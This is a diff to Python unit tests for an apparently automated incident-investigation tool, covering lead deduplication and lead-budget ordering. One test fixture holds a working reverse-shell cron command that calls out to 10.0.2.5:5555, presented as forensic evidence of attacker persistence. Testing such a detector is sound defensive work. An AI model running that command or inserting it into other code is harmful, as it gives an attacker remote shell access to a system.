@@ -164,9 +164,8 @@ class LeadModelTests(unittest.IsolatedAsyncioTestCase):
             remaining_run_budget=1,
             agent_name="investigation",
         )
-        self.assertEqual(len(result.approved), 1)
-        self.assertEqual(len(result.deferred), 2)
-        self.assertEqual(result.deferred[0].category, "over_cap")
+        self.assertEqual(len(result.approved), 3)
+        self.assertEqual(len(result.deferred), 0)
 
     async def test_spawns_both_backward_and_forward_leads(self):
         # Report whose Open Gaps name an initial-access (backward) gap and a
@@ -201,12 +200,13 @@ class LeadModelTests(unittest.IsolatedAsyncioTestCase):
         self.assertIn("forward", directions)
 
     async def test_duplicate_of_completed_task_is_rejected(self):
-        # A completed task is still in the dedup set; a signature-identical lead
-        # must be rejected even when the model approves it.
+        # A completed task with a firm conclusion should still block a
+        # signature-identical lead.
         existing = [{
             "title": "Review crontab contents for /var/spool/cron/crontabs/user",
             "description": "Pivots: path=/var/spool/cron/crontabs/user, host=kali",
             "status": "completed",
+            "summary": "## Findings\n- Confirmed the crontab diff inserted a reverse shell and fully answered the question.\n## New Leads\n- None.",
         }]
         response = json.dumps([{
             "title": "Inspect crontab persistence",
@@ -227,6 +227,89 @@ class LeadModelTests(unittest.IsolatedAsyncioTestCase):
         self.assertEqual(len(result.approved), 0)
         self.assertEqual(result.rejected[0].category, "duplicate")
 
+    async def test_active_task_title_similarity_blocks_duplicate(self):
+        # A pending task already investigating essentially the same question
+        # should block a semantically overlapping lead.
+        existing = [{
+            "title": "Verify whether any outbound connections or reverse-shell commands occurred after cron editing",
+            "description": "Pivots: host=kali, crontab=/var/spool/cron/crontabs/user",
+            "status": "pending",
+        }]
+        response = json.dumps([{
+            "title": "Verify any outbound reverse-shell callback or live C2 session to 10.0.2.5:5555",
+            "pivots": "ip=10.0.2.5, port=5555, time=2025-04-20T03:54:37Z",
+            "evidence": "cron job `sh -i >& /dev/tcp/10.0.2.5/5555 0>&1` found in crontab",
+            "priority": 80, "approved": True, "category": "approved",
+            "reason": "model thinks it is a new angle",
+        }])
+        result = await validate_leads_model(
+            StubModel(response),
+            leads_section="- lead",
+            final_answer="",
+            existing_tasks=existing,
+            current_task=None,
+            remaining_run_budget=3,
+            agent_name="investigation",
+        )
+        self.assertEqual(len(result.approved), 0)
+        self.assertEqual(result.rejected[0].category, "duplicate")
+
+    async def test_active_task_without_semantic_overlap_does_not_block(self):
+        existing = [{
+            "title": "Identify the source IP of the earliest suspicious login",
+            "description": "Pivots: host=kali, auth logs, ssh sessions",
+            "status": "pending",
+        }]
+        response = json.dumps([{
+            "title": "Verify crontab contents changed during the nano session",
+            "pivots": "host=kali, /tmp/crontab.Tgi9hP/crontab",
+            "evidence": "nano edited temp crontab path",
+            "priority": 80, "approved": True, "category": "approved",
+            "reason": "different investigative question",
+        }])
+        result = await validate_leads_model(
+            StubModel(response),
+            leads_section="- lead",
+            final_answer="",
+            existing_tasks=existing,
+            current_task=None,
+            remaining_run_budget=3,
+            agent_name="investigation",
+        )
+        self.assertEqual(len(result.approved), 1)
+        self.assertEqual(len(result.rejected), 0)
+
+    async def test_inconclusive_completed_task_does_not_block_duplicate_lead(self):
+        existing = [{
+            "title": "Investigate whether the attacker performed lateral movement or data access from kali after persistence",
+            "description": "Pivots: host=kali, callback=10.0.2.5:5555",
+            "status": "completed",
+            "summary": (
+                "## Findings\n"
+                "- Lateral movement and data access are not confirmed by the events retrieved in this task.\n"
+                "## Hypotheses\n"
+                "- [Open] Additional post-exploitation actions may have occurred outside the retrieved window."
+            ),
+        }]
+        response = json.dumps([{
+            "title": "Investigate whether the attacker performed lateral movement or data access from kali after persistence",
+            "pivots": "host=kali, callback=10.0.2.5:5555",
+            "evidence": "prior task remained open and did not confirm impact",
+            "priority": 80, "approved": True, "category": "approved",
+            "reason": "prior task was inconclusive",
+        }])
+        result = await validate_leads_model(
+            StubModel(response),
+            leads_section="- lead",
+            final_answer="",
+            existing_tasks=existing,
+            current_task=None,
+            remaining_run_budget=3,
+            agent_name="investigation",
+        )
+        self.assertEqual(len(result.approved), 1)
+        self.assertEqual(len(result.rejected), 0)
+
 
 def _decision(objective: str, score: int, idx: int) -> LeadDecision:
     cand = LeadCandidate(title=f"lead-{idx}", pivots="p", evidence="e", priority=score, original_index=idx)
@@ -234,22 +317,20 @@ def _decision(objective: str, score: int, idx: int) -> LeadDecision:
 
 
 class LeadBudgetDirectionTests(unittest.TestCase):
-    def test_backward_lead_not_crowded_out_by_higher_forward(self):
+    def test_unlimited_budget_preserves_score_order(self):
         pool = [
             _decision("c2_callback", 95, 0),       # forward, high
             _decision("lateral_movement", 90, 1),  # forward, high
             _decision("initial_access", 40, 2),     # backward, low
         ]
         approved, deferred = apply_lead_budget(pool, remaining_run_budget=2)
-        self.assertEqual(len(approved), 2)
-        dirs = {_lead_direction(d) for d in approved}
-        self.assertIn("backward", dirs)
-        self.assertIn("forward", dirs)
+        self.assertEqual([d.score for d in approved], [95, 90, 40])
+        self.assertEqual(deferred, [])
 
     def test_single_direction_pool_keeps_score_order(self):
         pool = [_decision("c2_callback", 95 - i, i) for i in range(4)]
         approved, _ = apply_lead_budget(pool, remaining_run_budget=10, max_approved=3)
-        self.assertEqual([d.score for d in approved], [95, 94, 93])
+        self.assertEqual([d.score for d in approved], [95, 94, 93, 92])
 
 
 if __name__ == "__main__":
